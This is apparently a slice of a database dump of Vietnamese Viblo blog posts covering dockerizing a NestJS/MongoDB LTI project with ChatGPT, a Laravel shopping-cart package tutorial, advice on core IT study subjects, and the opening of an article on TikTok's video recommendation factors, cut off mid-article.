FROM node:18.12.1-bullseye-slim

# Set the working directory
WORKDIR /app

# Copy the package.json and package-lock.json files
COPY package*.json ./

# Install the dependencies
RUN npm ci

# Copy the rest of the project files
COPY . .

# Expose port 3333
EXPOSE 3333

# Set the command to run the project
CMD [ "npm", "start" ]
```

**docker-compose.yml**

```yaml
version: ''3''
services:
  nestjs:
    build: .
    container_name: nestjs
    environment:
      - NODE_ENV=production
    ports:
      - "3333:3333"
    restart: unless-stopped
    networks:
      - app-network
    volumes:
      - .:/app
    depends_on:
      - mongodb
  mongodb:
    image: mongo
    container_name: mongodb
    environment:
      - MONGO_INITDB_ROOT_USERNAME=${MONGO_USERNAME}
      - MONGO_INITDB_ROOT_PASSWORD=${MONGO_PASSWORD}
    ports:
      - "27017:27017"
    restart: unless-stopped
    networks:
      - app-network
    volumes:
      - .:/app
      - ./mongo-data:/data/db
networks:
  app-network:
    driver: bridge

```


* Trước đây khi chưa có **ChatGPT** mình thường tốn khoảng chừng 10-15p để viết các file này, hiện tại mặc dù mới sử dụng nhưng mình thấy với vài dòng text đã giúp tiết kiệm đc khoảng 50% thời gian. Tuy nhiên chúng ta cũng cần phải chỉnh sửa lại để phù hợp với nhu cầu của mình hơn.

* Đầu tiên mình sẽ chỉnh sửa lại một tí để thử xem file **ChatGPT** đưa chúng ta có chạy được không. Ở **Dockerfile** mình sẽ thay đổi lệnh run về development. **Docker-compose** file sẽ đọc file và .env và chỉnh sửa biến để xác thực cho database và port trùng với trong file **.env**. Chúng ta cũng không cần mount volume của source vào trong mongodb container.

**Dockerfile**
```Dockerfile
# Use node:18.12.1-bullseye-slim as the base image
FROM node:18.12.1-bullseye-slim

# Set the working directory
WORKDIR /app

# node:18.12.1-bullseye-slim throw `ps: not found` if using nestjs watch mode, so install this stuff will help us resolve this error
RUN apt-get update && apt-get install -y procps && rm -rf /var/lib/apt/lists/*
...
CMD ["npm", "run", "start:dev"]
```

**docker-compose.yml**
```yaml
version: ''3''
services:
  ...
  mongodb:
    ...
    env_file:
      - .env
    environment:
      MONGO_INITDB_ROOT_USERNAME: ${DATABASE_USERNAME}
      MONGO_INITDB_ROOT_PASSWORD: ${DATABASE_PASSWORD}
    ports:
      - "27022:27017"
    expose:
     - 27017
    restart: unless-stopped
    networks:
      - app-network
    volumes:
      # - .:/app
      - ./mongo-data:/data/db
    ...
```

* Vì chúng ta đã thêm và auth cho database nên cần chỉnh sửa lại biến DATABASE_URI trong file **.env**.

*Lưu ý*: chúng ta sẽ thay đổi localhost thành tên service của mongodb thì mới có thể kết nối được.

```
...
DATABASE_URI=mongodb://admin:admin@mongodb:27017
...
```
* Chạy thử với docker-compose:

`docker-compose up`

* Nếu bạn nào gặp lỗi như hình dưới thì vào cập nhật lại phần kết nối mongoose ở **app.module.ts**.

![image.png](https://images.viblo.asia/535ac913-7bab-4ebb-b740-07dc950d4a29.png)

> Phần này mình không rõ nguyên do tại sao bị lỗi như vậy, nếu chúng ta không cấu hình xác thực cho mongo thì có thể kết nối bình thường nhưng ngược lại thì chúng ta phải tách ra thành 2 option như phía dưới. Bạn nào biết nguyên do có thể comment cho mình và mọi người biết nha. Cảm ơn các bạn

**app.module.ts**
```
...
MongooseModule.forRootAsync({
      imports: [ConfigModule],
      useFactory: async (config_service: ConfigService) => ({
        uri: config_service.get<string>(''DATABASE_URI''), // Tách database name thành option ở dưới
        dbName: config_service.get<string>(''DATABASE_API_NAME''),
      }),
    ...
```

* Kết quả:

![image.png](https://images.viblo.asia/e0b41b4e-1e57-42e7-8265-776ad9259b13.png)

* Truy cập http://localhost:3333/lti để kiểm tra. Nếu kết quả như hình thì đã thành công.

![image.png](https://images.viblo.asia/7a4cfcb9-1020-4326-8e4c-455cc8d35624.png)

Vậy là chúng ta đã Dockerizing thành công với sự hỗ trợ của **ChatGPT**, nhưng dừng ở đây thì quá đơn sơ. Chúng ta sẽ đến với phần tiếp theo để chỉnh sửa lại cho chỉnh chu hơn.
#  Cấu hình cho môi trường development
Phần này chúng ta sẽ chỉnh sửa lại để thuận tiện và phù hợp với quá trình phát triển module. Khi nảy chúng ta đã chỉnh sơ qua để kiểm tra nên giờ chỉ cần chỉnh sửa thêm đôi chút:
* Ở **Dockerfile** chúng ta sẽ sử dụng **multi-stage builds** cho các stage khác nhau. Ở đây mình đặt stage build front-end là *builder*, stage development là *development* và stage production là *production*. Mình cũng sẽ xóa `EXPOSE 3333` và chuyển `CMD ["npm", "run", "start:dev"]` ra ngoài file docker-compose. Thay vào đó thêm vào `RUN npm run build` đảm bảo NestJS được build trước khi chạy.


**Dockerfile**
```Dockerfile
FROM node:18.12.1-bullseye-slim as development

# Create app directory
WORKDIR /app

# node:18.12.1-bullseye-slim throw `ps: not found` if using nestjs watch mode, so install this stuff will help us resolve this error
RUN apt-get update && apt-get install -y procps && rm -rf /var/lib/apt/lists/*

# Copy the package.json and package-lock.json files
COPY package*.json ./

# Install the dependencies
RUN npm ci

# Copy the rest of the project files
COPY . .

RUN npm run build
```
* Các bạn chú ý mình sẽ sử dụng **npm ci** (**C**lean **I**nstall) thay vì **npm install**. Mục đích giúp chúng ta có thể đồng nhất version của các package căn cứ theo file **package-lock.json**.

> Use npm ci if you need a deterministic, repeatable build. For example during continuous integration, automated jobs, etc. and when installing dependencies for the first time, instead of npm install -  [Webwoman](https://stackoverflow.com/questions/52499617/what-is-the-difference-between-npm-install-and-npm-ci)

> Các bạn có thể tận dụng **ChatGPT** để hiểu rõ hơn:
> ![image.png](https://images.viblo.asia/b077026c-55ba-4bd7-a4c1-6fa9c77c8cb5.png)

* File **docker-compose.yml** mình sẽ thay version thành ver cao hơn để có thể sử dụng với *multi stage*. Sau đó thêm vào lệnh build theo stage trong **Dockerfile** - giá trị của target chính là tên stage chúng ta define sau từ khóa **as** của dòng `FROM node:18.12.1-bullseye-slim as development`. Tiếp theo đổi lại tên service và *container_name* để phân biệt với *production*. Sau cùng thêm vào lệnh run server dev.

```yml
version: ''3.8''
services:
  nestjs-dev:
    build:
      context: .
      target: development
    command: npm run start:dev
    container_name: nestjs-dev
    ...
```
* Thêm vào file **.dockerignore** ignore một số folder không cần thiết để rút ngắn thời gian ở Bước `COPY . .` .Ở đây chúng ta sẽ ignore **node_modules** vì nó sẽ được tạo ra trong container khi chúng ta run **npm ci**.

**.dockerignore**
```
node_modules
mongo-data
```

* Build và chạy lại để kiểm tra kết quả:

`docker-compose up --build`

* Xem lại log của container *nestjs-dev* vừa tạo nếu kết quả như hình kèm với khi các bạn chỉnh sửa code và save lại thì server tự động restart thì chúng ta đã thành công.

![image.png](https://images.viblo.asia/e0b41b4e-1e57-42e7-8265-776ad9259b13.png)

#  Cấu hình cho môi trường production
Đối với môi trường *production* cho LTI của chúng ta thì mình sẽ cho Docker tự động build front-end ở stage *builder* sau đó copy vào stage *production*. Cập nhật **Dockerfile** và thêm vào 2 stage trên. Mình sẽ giải thích chi tiết trong file dưới.

**Dockerfile**
```Dockerfile
FROM node:18.12.1-bullseye-slim as development
...

# Stage builder
FROM node:18.12.1-bullseye-slim as builder

WORKDIR /app

## Sao chép thư mục front-end vào container
COPY front-end ./

## Tiến hành cài đặt package
RUN npm ci

## Build ra file static
RUN npm run build

# Stage production
FROM node:18.12.1-bullseye-slim as production

## Cài đặt biến môi trường
ARG NODE_ENV=production
ENV NODE_ENV=${NODE_ENV}

WORKDIR /app
## Chúng ta vẫn cần thao tác lặp lại như ở development vì cả 2 stage nằm ở 2 container khác nhau
## và chúng ta chỉ copy nội dung build từ development chứ không copy node_modules
COPY package*.json ./

RUN npm ci --production

COPY . .

## Lấy thư mục đã build được từ development để sử dụng
COPY --from=development /app/dist ./dist

## Tương tự lây thư mục front-end đã build đuọc từ builder
COPY --from=builder /app/build ./public

## Ở đây khi chạy production chúng ta đã compile về Nodejs nên chỉ cần chạy như bình thường.
CMD [ "node", "dist/main" ]
```
> Giải thích: Các bạn sẽ thấy mình đã `npm ci` ở stage *development* nhưng sẽ tiếp tục `npm ci --production` ở stage *production* là do ở stage *development* chúng ta đang dev nên sẽ sử dụng một số devDependencies. Còn ở môi trường *production* thì chúng ta chỉ cần install các dependencies để giảm nhẹ node_modules. Đó là lý do vì sao chúng ta không copy node_modules ở stage *development* qua stage *production*. Và tại sao lại copy package*.json trước rồi mới copy phần còn lại thì việc này giúp chúng ta tận dụng chức năng Cache của Docker.  - Cảm ơn bạn **Kỳ Thịnh** đã góp ý!

> Các bạn cũng có thể hỏi **ChatGPT** để xem câu trả lời đúng không:
![image.png](https://images.viblo.asia/970e7873-ff25-41d2-8b8d-a170f80c4d55.png)
* Thêm vào service ***nestjs-prod*** vào file **docker-compose.yml** để tiến hành chạy stage *production*. Phần này sẽ có 2 hướng triển khai: 1 là các bạn làm như mình cho ngắn gọn, 2 là các bạn có thể tạo thêm file **docker-compose.prod.yml**. Cách 1 thì sẽ ngắn gọn hơn nhưng sẽ không rõ ràng và dễ đọc hiểu như cách 2. Ở service mongodb chúng ta cũng cho mount volume ra bên ngoài để đảm bảo toàn vẹn dữ liệu.

**docker-compose.yml**
```yml
version: ''3.8''
services:
  nestjs-dev:
    ...
  nestjs-prod:
    build:
      context: .
      target: production
    container_name: nestjs-prod
    environment:
      - NODE_ENV=production
    ports:
      - "3333:3333"
    restart: unless-stopped
    networks:
      - app-network
    volumes:
      - .:/app
    depends_on:
      - mongodb
  mongodb:
    ...
    volumes:
      # - .:/app
      - ./mongo-data:/data/db
    ...
```
* Chạy 2 lệnh dưới đây để cập nhật source **front-end** từ **submodule**

`git submodule init`

`git submodule update --recursive --remote`
* Chạy thử với lệnh `docker-compose up --build nestjs-prod`. Nếu gặp lỗi như hình dưới thì các bạn mở file **tsconfig.build.json** thêm vào thư mục front-end.
>Lỗi này là do khi build Typescript ở submodule front-end chúng ta chưa xài lệnh npm install hoặc npm ci. Có 2 cách giải quyết: hoặc là chỉnh sửa file **tsconfig.build.json** như trên hoặc là vào thư mục front-end gõ lệnh npm install hoặc npm ci.

![image.png](https://images.viblo.asia/0343ce63-cc51-40df-a70a-933ce1d0562d.png)

**tsconfig.build.json**
```json
{
  "extends": "./tsconfig.json",
  "exclude": ["node_modules", "test", "dist", "**/*spec.ts",  "front-end"]
}
```
* Thử lại với lệnh trên, các bạn để ý có thể thấy khi chúng ta build stage *production* thì **số bước** là **23** thay vì **7** ở development.
![image.png](https://images.viblo.asia/01982a5f-b0ad-42d8-b426-2f6825c1bb35.png)
* Nếu kết quả như hình thì chúng ta đã cấu hình xong. Chúng ta sẽ gặp 1 warning từ **ltijs** do **Dev Mode** vẫn còn enable, các bạn có thể vào để tắt đi nhé.

![image.png](https://images.viblo.asia/1a5a0c7d-d2ed-408a-b534-31ec3b100e03.png)

> Bổ sung: sử dụng các lệnh docker-compose đôi khi hơi dài dòng chúng ta sẽ tạo 2 npm script để rút gọn lại:

>**package.json**
> ```json
> {
>     ...
>     "script": {
>         ...
>         "docker:dev": "docker-compose up -d nestjs-dev",
>         "docker:prod": "docker-compose up -d nestjs-prod"
>     }
> }
> ```
# Kết luận
Vậy là chúng ta đã hoàn thành xong việc Dockerizing cho dự án LTI của mình cùng với sự giúp sức của **ChatGPT**. Việc phát triển và triển khai sẽ trở nên dễ dàng hơn rất nhiều và sau khi dockerizing thì việc tích hợp CI/CD cũng sẽ dễ dàng hơn. Chúng ta cũng có thể phần nào thấy được khả năng của **ChatGPT**, theo mình thì nếu chúng ta biết cách tận dụng thì **ChatGPT** sẽ là 1 trợ thủ đắc lực trong tương lai. Sắp tới mình sẽ viết 1 series về Lập trình với NestJS kết hợp với sự trợ giúp từ **ChatGPT** các bạn cùng đón xem nha.

Cảm ơn các bạn đã giành thời gian đọc bài viết. Chúc các bạn năm mới vui vẻ và thành công. Source code của bài viết này các bạn có thể tải về [ở đây](https://github.com/nntwelve/dockerizing-lti-nestjs).
# Tài liệu tham khảo
* https://stackoverflow.com/questions/52499617/what-is-the-difference-between-npm-install-and-npm-ci
* https://docs.docker.com/compose
* https://chat.openai.com', '2023-02-05T04:54:30.000000Z', '2023-02-28T02:48:04.000000Z', '2023-02-06T06:54:46.000000Z'),
	('Laravel - Xây dựng giỏ hàng đơn giản với bumbummen99', '5pPLkPn2VRZ', '4', 'public', 'https://images.viblo.asia/0877ee96-785b-4a21-9ea1-c34830ebb621.png', 'Giới thiệu
Nếu bạn đang triển khai một dự án Thương mại điện tử (E-Commerce), việc xây dựng một giỏ hàng và quản lý nó là một điều rất quan trọng. Thông thường, nếu ta code chức năng này theo cách thủ công thường sẽ tốn kha khá thời gian. Để tiết kiệm effort, ta có thể sử dụng những packages có sẵn hộ trợ về ShoppingCart như Crinsane/LaravelShoppingcart, bumbummen99/shoppingcart,  darryldecode/...', '# Giới thiệu
Nếu bạn đang triển khai một dự án Thương mại điện tử (E-Commerce), việc xây dựng một giỏ hàng và quản lý nó là một điều rất quan trọng. Thông thường, nếu ta code chức năng này theo cách thủ công thường sẽ tốn kha khá thời gian. Để tiết kiệm effort, ta có thể sử dụng những packages có sẵn hộ trợ về ShoppingCart như **Crinsane/LaravelShoppingcart**, **bumbummen99/shoppingcart**,  **darryldecode/cart**,...

Bài viết này, mình sẽ chia sẻ với mọi người package để xây dựng giỏ hàng mà mình đã sử dụng qua - **bumbummen99/shoppingcart** - về tính năng, cách sử dụng và những lợi ích của nó. Cho đến thời điểm viết bài, Package này tương thích với Laravel từ phiên bản 8+ trở xuống.
# Cài đặt
Để cài đặt Package Bumbummen99 chúng ta chạy lệnh sau:
```
composer require bumbummen99/shoppingcart
```
Để config lại Package Bumbummen chúng ta phải publish nó trong Vendor thông qua lệnh sau:
```
php artisan vendor:publish --provider="Gloudemans\Shoppingcart\ShoppingcartServiceProvider"
--tag="config"
```
Điều này sẽ cung cấp cho chúng ta file cart.php trong folder config để có thể thực hiện các thay đổi với các thông số của nó.

Bây giờ package đã sẵn sàng để bắt đầu sử dụng xây dựng giỏ hàng cho project.
# Sử dụng
## Khai báo
Để sử dụng nó, trước tiên chúng ta cần gọi nó trong Controller mà ta viết logic cho giỏ hàng
```
use Cart;
```
## Một số hàm quan trọng
### Thêm sản phẩm vào giỏ hàng
Package cung cấp phương thức `Cart::add()` để thêm vào giỏ hàng
```
Cart::add(''id'' => ''293ad'', ''name'' => ''Product 1'', ''qty'' => 1, ''price'' => 9.99, ''weight'' => 550, ''options'' => [''size'' => ''large'']);
```
Trong đó:
* **id, name, qty, price, weight**: là những thuộc tính cơ bản cần có của một ứng dụng Shopping Cart, và cũng là bắt buộc của Bumbummen. Nếu không sử dụng thuộc tính nào thì có thể cho giá trị bằng 0 và bỏ qua, tuy nhiên không được phép xóa.
* **options**: các thuộc tính bổ sung cần dùng của riêng bạn nếu như chưa được khai báo ở trên.

Ví dụ, chẳng hạn một sản phẩm là **cái áo**, ta cần truyền vào phương thức những giá trị bắt buộc như id để lưu id của nó, **name**: tên của chiếc áo, **qty**: số lượng áo người dùng chọn, **price**: giá, **weight**: chiếc áo thì không cần khối lượng nên ta truyền giá trị bất kì và không cần quan tâm đến nó. Ngoài ra, để đặt một chiếc áo chúng ta cần có thêm size, màu, code,... ta sẽ thêm chúng vào mảng options.

Ta xây dựng function để thêm chiếc áo, đặt tên là addToCart.
```
    public function addToCart(Request $request, $id)
    {
        $product = Product::find($id);
        $qty = $request->quantity;
        $size = $request->size;

        Cart::add([
            ''id'' => $product->id,
            ''name'' => $product->name,
            ''price'' => $product->price,
            ''qty'' => $qty,
            ''weight'' => 0,
            ''options'' => [''code'' => $product->code, ''image'' => $product->image, ''size'' => $size]
        ]);
        return redirect("gio-hang");
    }
 ```

 Cùng phân tích một chút. Người dùng thêm chiếc áo, function addToCart được thực thi.

 Trước tiên, sẽ **find** chiếc áo đó theo **$id** và lấy các trường như **quantity**, **size** từ **view** thông qua **Request**. Sau đó, sử dụng phương thức `Cart::add()` và truyền các thuộc tính như code ở trên để thêm được sản phẩm vào giỏ hàng.
### Hiển thị sản phẩm trong giỏ hàng.
Ta dùng:
```
Cart::content();
```
Trong đó:
*	**Cart::content()** trả về một mảng các sản phẩm trong giỏ hàng, mỗi sản phẩm sẽ được lưu trữ dưới dạng một đối tượng. Mình ví dụ thử dd(Cart::content()) để xem nó trả ra như nào:

![image.png](https://images.viblo.asia/0877ee96-785b-4a21-9ea1-c34830ebb621.png)

Ngoài một số trường mình đã giới thiệu ở trên, trong ảnh còn một số trường khác như **rowId**,...

 **rowId** sẽ được package tự động sinh ra sau khi chúng ta sử dụng phương thức **add()** để thêm sản phẩm vào giỏ hàng. **rowId** được sinh ra với mục đích để định danh sản phẩm đã được thêm vào giỏ hàng, nó được sử dụng cho một số hàm mình sẽ giới thiệu ở dưới đây.

Mục đích chính của phương thức này là lấy ra những sản phẩm trong giỏ hàng mà người dùng đã **addToCart** và để xây dựng chi tiết giỏ hàng để hiển thị cho người dùng chẳng hạn.
### Lấy ra một sản phẩm trong giỏ hàng
Nếu bạn muốn lấy một mặt hàng từ giỏ hàng bằng cách sử dụng **rowId** của nó, bạn chỉ cần gọi phương thức **get()** trên giỏ hàng và chuyển cho nó **rowId**.
```
$rowId = ''da39a3ee5e6b4b0d3255bfef95601890afd80709'';

Cart::get($rowId);
```

### Tính tổng tiền trong giỏ hàng
#### Tổng trước thuế
```
//	Định dạng tiền chưa được Format
Cart::priceTotal();

//	Định dạng tiền được Format tương tự như hàm number_format trong PHP
Cart::priceTotal($decimals, $decimalSeparator, $thousandSeparator);
```
#### Tổng sau thuế
Code:
```
//	Định dạng tiền chưa được Format
Cart::total();

//	Định dạng tiền được Format tương tự như hàm number_format trong PHP
Cart::total($decimals, $decimalSeparator, $thousandSeparator);
```

Trong đó:
* Chiết khấu thuế được tính theo %, và mặc định là 21% được khai báo tại file config `config/cart.php`.
* Ta có thể config lại bằng cách thay đổi giá trị của trường `''tax'' => 21` thành `''tax'' => 8` theo thuế GTGT tại Việt Nam
 ![image.png](https://images.viblo.asia/30141128-a81c-4933-94a5-3cdb2f8b698d.png)

 ### Cập nhật giỏ hàng
Để cập nhật giỏ hàng, ta có thể sử dụng phương thức sau
```
Cart::update($rowId, $qty);
```

Trong đó:
* $**rowId**: chuỗi ký tự ngẫu nhiên được sinh một cách tự động để quản lý mỗi sản phảm trong giỏ hàng mỗi khi thêm mới một sản phẩm vào giỏ.
* **$qty**: số lượng mới cần cập nhật

Nếu bạn muốn cập nhật các tùy chọn trong **options** của một mặt hàng trong giỏ hàng, có thể dùng
```
$rowId = ''da39a3ee5e6b4b0d3255bfef95601890afd80709'';

Cart::update($rowId, [''options''  => [''size'' => ''S'']]);
// Will update the size option with new value
```
### Xóa giỏ hàng
#### Xóa 1 sản phẩm
Để xóa một mặt hàng khỏi giỏ hàng, bạn sẽ cần lại **rowId**. **RowId** này bạn chỉ cần chuyển đến phương thức **remove()** và nó sẽ xóa mặt hàng khỏi giỏ hàng.
```
$rowId = ''da39a3ee5e6b4b0d3255bfef95601890afd80709'';

Cart::remove($rowId);
```

#### Xóa toàn bộ giỏ hàng
Nếu bạn muốn xóa hoàn toàn nội dung của giỏ hàng, bạn có thể gọi phương thức **destroy()**. Thao tác này sẽ xóa tất cả **CartItems** khỏi giỏ hàng đối với phiên giỏ hàng hiện tại.
```
Cart::destroy();
```

Phương thức này sẽ giúp ích cho chúng ta trong trường hợp người dùng đặt hàng thành công tất cả sản phẩm trong giỏ hàng và nó sẽ xóa toàn bộ giỏ hàng đi.

## Một số phương thức khác
### Cart::weight()
*    để lấy tổng trọng lượng của tất cả các mặt hàng trong giỏ hàng, dựa trên trọng lượng và số lượng của chúng
```
Cart::weight();

// format weight
Cart::weight($decimals, $decimalSeperator, $thousandSeperator);
```
### Cart::tax()
* lấy ra tổng số tiền thuế đã tính cho tất cả các mặt hàng trong giỏ hàng, dựa trên giá và số lượng
```
Cart:tax()

// format
Cart::tax($decimals, $decimalSeparator, $thousandSeparator);
```
### Cart::count()
* Nếu bạn muốn biết có bao nhiêu mặt hàng trong giỏ hàng của mình, bạn có thể sử dụng phương thức **count()**. Phương thức này sẽ trả về tổng số mặt hàng trong giỏ hàng. Vì vậy, nếu bạn đã thêm 2 cuốn sách và 1 áo sơ mi, nó sẽ trả về 3 mục.
```
Cart::count()
```
### Cart::search()
* Tìm kiếm sản phẩm trong giỏ hàng theo thuộc tính của nó

 Ví dụ, nếu bạn muốn tìm tất cả các mục có id là 1
Ví dụ
```
$cart->search(function ($cartItem, $rowId) {
	return $cartItem->id === 1;
});
```

### Một số hàm để set giá trị cho Tax, Discount,...

```
// setTax
Cart::setTax($rowId, $taxRate)
// VD
Cart::setTax($rowId, 21);
$cart->setTax($rowId, 21);

// set discount
Cart::setDiscount($rowId, $taxRate)
// VD
Cart::setDiscount($rowId, 21);
$cart->setDiscount($rowId, 21);

//Set global tax
Cart::setGlobalTax($taxRate)

// set global discount
Cart::setGlobalDiscount($discountRate)
```

### Bạn có thể tìm hiểu thêm một số hàm hoặc hiểu rõ hơn các hàm tại
[https://packagist.org/packages/bumbummen99/shoppingcart](https://packagist.org/packages/bumbummen99/shoppingcart)

# Tổng kết
Bài viết trên mình đã tổng hợp lại các hàm và cách sử dụng của package **bumbummen99**. Mình thấy đây là một package khá là có ích và dễ dàng sử dụng. Mong rằng sẽ giúp ích cho quá trình code của các bạn. Nếu có thiếu xót ở đâu mong nhận được những góp ý của mọi người

Hẹn gặp lại các bạn ở những bài viết sau.
Thân ái!

Tài liệu tham khảo: [https://packagist.org/packages/bumbummen99/shoppingcart](https://packagist.org/packages/bumbummen99/shoppingcart)', '2023-02-05T03:20:08.000000Z', '2023-02-28T03:11:04.000000Z', '2023-02-03T15:22:50.000000Z'),
	('4 môn học sinh viên IT cần phải học thật kỹ', 'BQyJKjPw4Me', '5', 'public', 'https://images.viblo.asia/20f9fae7-7d5d-44bd-b7aa-558afc5f42d4.jpg', 'Đầu tiên, nhân dịp năm mới, xin chúc toàn thể anh chị và các bạn trên cộng đồng Viblo một năm mới thật nhiều sức khỏe, vui vẻ và hạnh phúc nha!

Bất kỳ sinh viên IT nào muốn sau khi tốt nghiệp có việc làm ngay thì phải cần học thật kỹ 4 môn học này, đặc biệt là các bạn sinh viên năm nhất chuẩn bị vẫn còn kịp nha!

1. Lập trình căn bản
Đây là môn học sẽ cũng cấp cho bạn những kiến thức nền tảng ...', '> Đầu tiên, nhân dịp năm mới, xin chúc toàn thể anh chị và các bạn trên cộng đồng Viblo một năm mới thật nhiều sức khỏe, vui vẻ và hạnh phúc nha!

Bất kỳ sinh viên IT nào muốn sau khi tốt nghiệp có việc làm ngay thì phải cần học thật kỹ 4 môn học này, đặc biệt là các bạn sinh viên năm nhất chuẩn bị vẫn còn kịp nha!
![coding-g25f63950e_1920.jpg](https://images.viblo.asia/20f9fae7-7d5d-44bd-b7aa-558afc5f42d4.jpg)
# 1. Lập trình căn bản
Đây là môn học sẽ cũng cấp cho bạn những kiến thức nền tảng nhất trong lập trình và giúp các bạn hình thành được tư duy lập trình ở mức độ căn bản nhất. Ở môn học này bạn sẽ được học những khái niệm như là kiểu dữ liệu, biến, các câu lệnh rẽ nhánh, vòng lặp, hàm,... Đây là những khái niệm chung mà hầu như tất cả các ngôn ngữ lập trình phổ biến hiện giờ đều có, cho nên không cần biết là trường bạn dạy môn này bằng ngôn ngữ lập trình gì, có thể là C, Python hay Java, các bạn cũng đừng quá tập trung vào ngôn ngữ đó bởi vì khi bạn đã nắm vững được những khái niệm này bạn có thể dễ dàng học được những ngôn ngữ lập trình khác. Cho nên là khi bạn học môn này bạn hãy cố gắng hình thành cho mình cái tư duy lập trình, tức là bạn phải biết là nên tạo biến khi nào, lúc nào thì nên dùng vòng lặp for, lúc nào thì nên dùng vòng lặp while, vân vân và mây mây.

# 2. Lập trình hướng đối tượng
Nghe tên của cái môn học là các bạn đã thấy khó hiểu rồi phải không. Đây là môn học giúp bạn cấu trúc các dòng code theo từng cái lớp (tiếng anh gọi là class á), mỗi lớp sẽ đại diện cho một đối tượng trong chương trình, cái khái niệm đối tượng là gì thì các bạn sẽ được giải thích khi học môn này. Hầu như tất cả các thư viện, các framework (mấy cái mà nó sẽ hỗ trợ mình lập trình nhanh hơn á) thì nó đều xây dựng theo dạng lập trình hướng đối tượng, và khi các bạn đi làm thì dự án bạn làm cũng sẽ sử dụng 1 cái framework nào đó cho nên là khi các bạn không nắm vững kiến thức về hướng đối tượng thì coi như xong luôn á nha 😂.

# 3. Cơ sở dữ liệu
Các phần mềm hay là trang web thì đều có dữ liệu của người dùng, mà khoảng 99,99% dữ liệu đó được lưu ở trong cơ sở dữ liệu, cho nên là các bạn phải nắm được nhưng kiến thức căn bản về cơ sở dữ liệu cũng như cách lưu dữ liệu vào, lấy dữ liệu ra như thế nào. Thì cái môn học này sẽ cung cấp cho bạn những kiến thức nền tảng đó.

# 4. Phân tích và thiết kế thuật toán
Nghe tới thuật toán thì các bạn nghĩ nó là một cái gì đó nó cao siêu, ghê gớm lắm phải không. Nhưng mà các bước để bạn có thể hoán đổi nước ở trong hai chai nước bằng cách dùng thêm cái chai thứ ba hoặc là cái ly gì đó thì nó cũng được gọi là thuật toán nha các bạn chứ không phải khi nói tới thuật toán là nó phải là cái gì đó hoành tráng, ghê gớm lắm. Đây là cái môn nó sẽ giúp bạn biết được cái đoạn code của bạn viết nó chạy có lâu hay không, nó có ngốn tài nguyên hay không. Qua đó, bạn sẽ hình thành được cái tư duy về cách viết code làm sao tối ưu nhất có thể. Các bạn không thể nào viết cái phần mềm mà khi các bạn bấm nút tìm kiếm xong là phải chờ 10 phút sau thì mới ra kết quả, cái phần mềm đó đưa cho heo dùng nó còn chê nha các bạn 🤣.

Cảm ơn các bạn đã đọc và hi vọng bài viết này có thể cung cấp thêm một số thông tin có ích cho bạn, đặc biệt là các bạn sinh viên!', '2023-02-05T03:11:17.000000Z', '2023-02-28T03:00:23.000000Z', '2023-02-05T03:11:01.000000Z'),
	('Thuật toán đánh giá video của TikTok hoạt động như thế nào?', '2oKLnN7WLQO', '6', 'public', 'https://images.viblo.asia/38571e54-6cd1-4af0-8c82-45f5ef54ae9b.jpeg', 'Trong lúc loay hoay tìm chủ đề tiếp theo để chia sẻ lên Viblo thì mình lại nhận được câu hỏi từ người bạn non-tech là làm sao để video TikTok của bạn ấy lên xu hướng. Sau khi tìm tòi thì mình cũng tìm ra vài thứ khá thú vị xung quanh câu chuyện muốn làm idol TikTok của bạn mình. Thật tình cờ là trên Viblo chưa có bất kì một bài viết nào liên quan đến TikTok nên mình quyết định chia sẻ. Mong là ...', 'Trong lúc loay hoay tìm chủ đề tiếp theo để chia sẻ lên Viblo thì mình lại nhận được câu hỏi từ người bạn non-tech là **làm sao để video TikTok của bạn ấy lên xu hướng**. Sau khi tìm tòi thì mình cũng tìm ra vài thứ khá thú vị xung quanh **câu chuyện muốn làm idol TikTok của bạn mình**. Thật tình cờ là trên **Viblo** chưa có bất kì một bài viết nào liên quan đến **TikTok** nên mình quyết định chia sẻ. Mong là với bài viết mở đường này, sẽ có thêm nhiều bài viết hay ho nữa về một mạng xã hội đang rất hot này.

Cảnh báo nội dung bài viết không thực sự có nhiều tech lắm vì đơn giản nó **không phải open source** để mổ xẻ chi tiết như là [Reddit](https://github.com/reddit-archive/reddit) hoặc [Hacker News](https://medium.com/hacking-and-gonzo/how-hacker-news-ranking-algorithm-works-1d9b0cf2c08d). Sẽ không phải tìm ra những công thức tính toán hay nói cho các bạn biết làm sao để 100% các video của bạn sẽ lên được xu hướng.

# 1. Các yếu tố đánh giá video


Sau rất nhiều đồn đoán về cách mà **TikTok** đánh giá video của chúng ta như thế nào. Có lẽ vì đã không chịu được áp lực từ dư luận, tháng **6/2020** **TikTok** đã chính thức có [bài viết](https://newsroom.tiktok.com/en-us/how-tiktok-recommends-videos-for-you) công bố các yếu tố góp phần để đánh giá nội dung của một video.

Theo bài viết, có 3 yếu tố chính quyết định xem video của bạn có lên xu hướng được hay không.

* ***Tương tác người dùng*** chẳng hạn như video bạn **thích** hoặc **chia sẻ**, **tài khoản bạn theo dõi**, **bình luận** bạn đăng và **nội dung** bạn tạo.
* ***Thông tin video*** có thể bao gồm các chi tiết như **chú thích video**, **âm thanh** và **hashtags**. Có một dạo mình lên **TikTok** cứ video nào có sound bài See Tình của Hoàng Thùy Linh là **TikTok** luôn luôn gợi ý cho mình T.T.
* ***Cài đặt tài khoản và thiết bị*** như **tùy chọn ngôn ngữ**, **cài đặt quốc gia** và **loại thiết bị của bạn**. Các yếu tố này được đưa vào để đảm bảo hệ thống được **tối ưu hóa cho hiệu suất**, nhưng chúng có **trọng số thấp hơn** trong hệ thống **recommendation** so với các điểm dữ liệu khác mà vì người dùng đôi khi **không thể chủ động lựa chọn** các yếu tố này được.

Tất cả những yếu tố này được **TikTok** **xử lí** và **tính trọng số** dựa trên giá trị của chúng đối với người dùng. Ví dụ như trọng số liệu **người dùng có xem video dài từ đầu đến cuối** sẽ lớn hơn trọng số người xem và người tạo video có **cùng một quốc gia**.

Bạn sẽ để ý một vài TikToker như [**Manh Vibe**](https://www.tiktok.com/@manhvibe) đang tận dụng rất tốt cách làm video để người dùng **xem đi xem lại** video bằng cách **kết thúc video liên quan đến câu nói mở đầu** của anh ấy để giúp video có khả năng lên xu hướng cao hơn.

Nhìn vào trọng số ta cũng có thể thấy rằng kể cả người dùng có **nhiều người theo dõi** hay **video cũ có nhiều lượt tiếp cận hơn** cũng không phải là yếu tố trực tiếp trong **hệ thống recommendation** của TikTok. Đều này cũng góp phần làm cho sân chơi TikTok trở lên công bằng hơn với mọi người.

# 2. TikTok phân tích video như thế nào
